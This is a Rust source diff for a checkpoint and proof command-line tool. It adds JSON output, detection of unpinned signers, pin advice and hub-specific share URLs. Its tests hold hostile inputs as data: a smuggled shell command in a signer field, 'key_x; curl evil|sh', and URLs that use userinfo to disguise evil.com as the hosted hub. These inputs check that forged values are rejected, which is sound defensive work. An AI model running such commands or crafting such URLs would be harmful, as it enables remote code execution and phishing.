@@ -5,7 +5,9 @@ use ed25519_dalek::{Signer, SigningKey};
 use rand::RngCore;
 use sha2::{Digest, Sha256};
 use std::time::{SystemTime, UNIX_EPOCH};
-use treeship_core::merkle::{ArtifactSummary, Checkpoint, MerkleTree, ProofFile};
+use treeship_core::merkle::{
+    ArtifactSummary, Checkpoint, CheckpointVerifyOutcome, MerkleTree, ProofFile,
+};
 
 use crate::{ctx, printer::Printer};
 
@@ -124,6 +126,28 @@ pub fn checkpoint(
     config: Option<&str>,
     printer: &Printer,
 ) -> Result<(), Box<dyn std::error::Error>> {
+    checkpoint_with(config, false, printer)
+}
+
+/// `treeship checkpoint --publish`: seal, then push to the attached hub in
+/// the same command. A failed push is a failure (nonzero exit); the
+/// checkpoint itself is still on disk.
+pub fn checkpoint_with(
+    config: Option<&str>,
+    publish_after: bool,
+    printer: &Printer,
+) -> Result<(), Box<dyn std::error::Error>> {
+    seal_checkpoint(config, printer)?;
+    if publish_after {
+        publish(config, printer)?;
+    }
+    Ok(())
+}
+
+fn seal_checkpoint(
+    config: Option<&str>,
+    printer: &Printer,
+) -> Result<(), Box<dyn std::error::Error>> {
     let ctx = ctx::open(config)?;
     let (tree, _artifact_ids) = build_tree(&ctx)?;
 
@@ -144,6 +168,22 @@ pub fn checkpoint(
 
     // Save latest.json (copy, not symlink, for portability)
     fs::write(cp_dir.join("latest.json"), &cp_json)?;
+
+    if printer.format == crate::printer::Format::Json {
+        // Full-length root and real numbers: the text view shortens the
+        // root for the eye, but a script needs the whole hash.
+        printer.json(&serde_json::json!({
+            "status": "ok",
+            "index": cp.index,
+            "root": cp.root,
+            "tree_size": cp.tree_size,
+            "height": cp.height,
+            "signer": cp.signer,
+            "signed_at": cp.signed_at,
+            "file": cp_dir.join(&filename),
+        }));
+        return Ok(());
+    }
 
     let root_short = short_hash(&cp.root);
 
@@ -275,6 +315,21 @@ pub fn proof(
     let out_path = format!("{}.proof.json", artifact_id);
     fs::write(&out_path, &proof_json)?;
 
+    if printer.format == crate::printer::Format::Json {
+        printer.json(&serde_json::json!({
+            "status": "ok",
+            "artifact_id": artifact_id,
+            "leaf_index": leaf_index,
+            "tree_size": checkpoint.tree_size,
+            "leaf_hash": inclusion_proof.leaf_hash,
+            "root": checkpoint.root,
+            "checkpoint_index": checkpoint.index,
+            "path_len": inclusion_proof.path.len(),
+            "file": out_path,
+        }));
+        return Ok(());
+    }
+
     let root_short = short_hash(&checkpoint.root);
 
     printer.success(
@@ -368,7 +423,17 @@ pub fn verify(
             format!("trust-root: {e}").into()
         },
     )?;
-    let sig_valid = proof_file.checkpoint.verify(&trust);
+    // `verify_detailed` keeps apart what `verify` collapses to `false`: a
+    // signature that does not hold, and a valid signature from a signer this
+    // machine has not pinned. The second is a trust decision, not tampering,
+    // and it is exactly what a ship's own fresh checkpoint looks like before
+    // its key is pinned as `hub_checkpoint` (CLI-5).
+    let outcome = proof_file.checkpoint.verify_detailed(&trust);
+    let sig_valid = outcome == CheckpointVerifyOutcome::Valid;
+    let unpinned_key = match &outcome {
+        CheckpointVerifyOutcome::SignerNotPinned { public_key } => Some(public_key.clone()),
+        _ => None,
+    };
 
     // 2. Verify inclusion proof. The trusted merkle_version is the one
     // bound into the checkpoint signature, NOT the one in the proof
@@ -487,16 +552,51 @@ pub fn verify(
             proof_file.checkpoint.signed_at
         ));
         printer.info("  It cannot have been inserted or backdated after this time.");
+    } else if let (Some(public_key), true, true) = (&unpinned_key, proof_valid, root_matches) {
+        // Everything holds except the trust decision. The key comes from the
+        // checkpoint itself, so the pin line is not a copy-paste that trusts
+        // it blindly: no `--yes`, and the reader confirms the key elsewhere.
+        let key_id = &proof_file.checkpoint.signer;
+        let detail = pin_advice(key_id, public_key);
+        if printer.format == crate::printer::Format::Json {
+            printer.json(&serde_json::json!({
+                "outcome": "not_pinned",
+                "artifact": proof_file.artifact_id,
+                "key_id": key_id,
+                "public_key": public_key,
+                "inclusion_proof": "valid",
+                "detail": detail,
+            }));
+        } else {
+            printer.failure(
+                "checkpoint signer not pinned",
+                &[
+                    ("artifact", &proof_file.artifact_id),
+                    ("signature", "valid"),
+                    ("inclusion", "valid"),
+                    ("detail", &detail),
+                ],
+            );
+        }
+        return Err(crate::exit::not_pinned(format!(
+            "checkpoint signer {key_id:?} not pinned"
+        )));
     } else {
         let mut reasons = Vec::new();
-        if !sig_valid {
-            reasons.push("checkpoint signature invalid");
+        match &outcome {
+            CheckpointVerifyOutcome::Valid => {}
+            CheckpointVerifyOutcome::SignerNotPinned { .. } => {
+                reasons.push("checkpoint signer not pinned".to_string())
+            }
+            CheckpointVerifyOutcome::Invalid { reason } => {
+                reasons.push(format!("checkpoint signature invalid ({reason})"))
+            }
         }
         if !proof_valid {
-            reasons.push("inclusion proof invalid");
+            reasons.push("inclusion proof invalid".to_string());
         }
         if !root_matches {
-            reasons.push("root hash does not match expected");
+            reasons.push("root hash does not match expected".to_string());
         }
         printer.failure(
             "verification failed",
@@ -521,6 +621,29 @@ pub fn status(config: Option<&str>, printer: &Printer) -> Result<(), Box<dyn std
     let total_artifacts = tree.len();
     let num_checkpoints = count_checkpoints()?;
     let latest_cp = load_latest_checkpoint()?;
+
+    if printer.format == crate::printer::Format::Json {
+        let latest = latest_cp.as_ref().map(|cp| {
+            serde_json::json!({
+                "index": cp.index,
+                "root": cp.root,
+                "tree_size": cp.tree_size,
+                "height": cp.height,
+                "signed_at": cp.signed_at,
+                "signer": cp.signer,
+            })
+        });
+        printer.json(&serde_json::json!({
+            "total_artifacts": total_artifacts,
+            "checkpoints": num_checkpoints,
+            "latest": latest,
+            "uncheckpointed": latest_cp
+                .as_ref()
+                .map(|cp| total_artifacts.saturating_sub(cp.tree_size))
+                .unwrap_or(total_artifacts),
+        }));
+        return Ok(());
+    }
 
     printer.blank();
     printer.section("Local Merkle tree");
@@ -730,13 +853,56 @@ pub fn publish(config: Option<&str>, printer: &Printer) -> Result<(), Box<dyn st
 
     if let Some(first_id) = first_published_id {
         printer.hint(&format!(
-            "treeship.dev/merkle?id={}  (any artifact is now verifiable via Hub)",
-            first_id
+            "{}  (any artifact is now verifiable via Hub)",
+            proof_share_url(endpoint, first_id)
         ));
     }
     printer.blank();
 
     Ok(())
+}
+
+/// What to tell a reader whose checkpoint signer is not pinned. Both values
+/// come from the checkpoint itself: the public key has already decoded as a
+/// 32-byte Ed25519 key (base64url), but `signer` is free text a self-signed
+/// forgery controls, so the copy-paste `trust add` line is printed only when
+/// it is a well-formed key id; anything else is quoted and gets no command.
+fn pin_advice(key_id: &str, public_key: &str) -> String {
+    if crate::commands::trust::looks_like_key_id(key_id) {
+        format!(
+            "checkpoint signer {key_id} is not pinned here. Confirm this key out of band (from the hub operator or a source you trust), then: treeship trust add {key_id} ed25519:{public_key} --kind hub_checkpoint"
+        )
+    } else {
+        format!(
+            "checkpoint signer {key_id:?} is not pinned here, and its signer field is not a key id, so no pin command is offered. Its public key is ed25519:{public_key}; confirm it out of band before trusting anything it signed"
+        )
+    }
+}
+
+/// Where the proof just published can be read. The hub serves it at
+/// `<endpoint>/v1/merkle/<artifact>`; only the hosted hub (`api.treeship.dev`)
+/// has the treeship.dev page. The URL comes from the attached endpoint, never
+/// from a default, so a self-hosted hub's proofs are not advertised on
+/// treeship.dev (W1-9, CLI-12).
+fn proof_share_url(endpoint: &str, artifact_id: &str) -> String {
+    let base = endpoint.trim_end_matches('/');
+    // The host of the authority: after the scheme, up to the first `/`, `?`
+    // or `#`; without any `user:pass@` (the part after the last `@`); without
+    // the port; without a trailing root dot. `https://api.treeship.dev:x@evil`
+    // is evil's host, not ours.
+    let after_scheme = base.split_once("://").map_or(base, |(_, rest)| rest);
+    let authority = after_scheme.split(['/', '?', '#']).next().unwrap_or("");
+    let hostport = authority.rsplit_once('@').map_or(authority, |(_, h)| h);
+    let host = hostport
+        .rsplit_once(':')
+        .filter(|(_, port)| port.chars().all(|c| c.is_ascii_digit()))
+        .map_or(hostport, |(h, _)| h)
+        .trim_end_matches('.');
+    if host.eq_ignore_ascii_case("api.treeship.dev") {
+        format!("https://treeship.dev/merkle?id={artifact_id}")
+    } else {
+        format!("{base}/v1/merkle/{artifact_id}")
+    }
 }
 
 /// Load the checkpoint immediately before `index` (i.e. `index - 1`), if it
@@ -880,7 +1046,71 @@ fn build_dpop_jwt(
 
 #[cfg(test)]
 mod publish_tests {
-    use super::is_missing_hub_artifact;
+    use super::{is_missing_hub_artifact, pin_advice, proof_share_url};
+
+    #[test]
+    fn proof_share_url_follows_the_attached_hub() {
+        // Only the hosted hub has the treeship.dev page.
+        for hosted in [
+            "https://api.treeship.dev",
+            "https://API.treeship.dev/",
+            "https://api.treeship.dev:443",
+        ] {
+            assert_eq!(
+                proof_share_url(hosted, "art_1"),
+                "https://treeship.dev/merkle?id=art_1"
+            );
+        }
+        // A self-hosted hub serves its own proofs at /v1/merkle/<id>.
+        assert_eq!(
+            proof_share_url("https://hub.example.com/", "art_1"),
+            "https://hub.example.com/v1/merkle/art_1"
+        );
+        assert_eq!(
+            proof_share_url("http://127.0.0.1:8080", "art_1"),
+            "http://127.0.0.1:8080/v1/merkle/art_1"
+        );
+        // A look-alike host is not the hosted hub.
+        assert_eq!(
+            proof_share_url("https://api.treeship.dev.evil.example", "art_1"),
+            "https://api.treeship.dev.evil.example/v1/merkle/art_1"
+        );
+        // userinfo is not the host: this URL's host is evil.com.
+        for evil in [
+            "https://api.treeship.dev:x@evil.com",
+            "https://api.treeship.dev@evil.com",
+            "https://user:pw@evil.com/?h=api.treeship.dev",
+        ] {
+            assert!(
+                !proof_share_url(evil, "art_1").starts_with("https://treeship.dev/"),
+                "{evil}"
+            );
+        }
+        // A trailing root dot and a query are still the hosted hub.
+        for hosted in ["https://api.treeship.dev./", "https://api.treeship.dev?x=1"] {
+            assert_eq!(
+                proof_share_url(hosted, "art_1"),
+                "https://treeship.dev/merkle?id=art_1",
+                "{hosted}"
+            );
+        }
+    }
+
+    #[test]
+    fn pin_advice_offers_a_command_only_for_a_key_id() {
+        let ok = pin_advice("key_0123456789abcdef", "AAAA");
+        assert!(
+            ok.contains(
+                "then: treeship trust add key_0123456789abcdef ed25519:AAAA --kind hub_checkpoint"
+            ),
+            "{ok}"
+        );
+        assert!(!ok.contains("--yes"), "{ok}");
+        // A self-signed forgery controls the signer field.
+        let evil = pin_advice("key_x; curl evil|sh", "AAAA");
+        assert!(!evil.contains("treeship trust add"), "{evil}");
+        assert!(evil.contains("\"key_x; curl evil|sh\""), "{evil}");
+    }
 
     #[test]
     fn only_missing_artifact_404_is_skippable() {
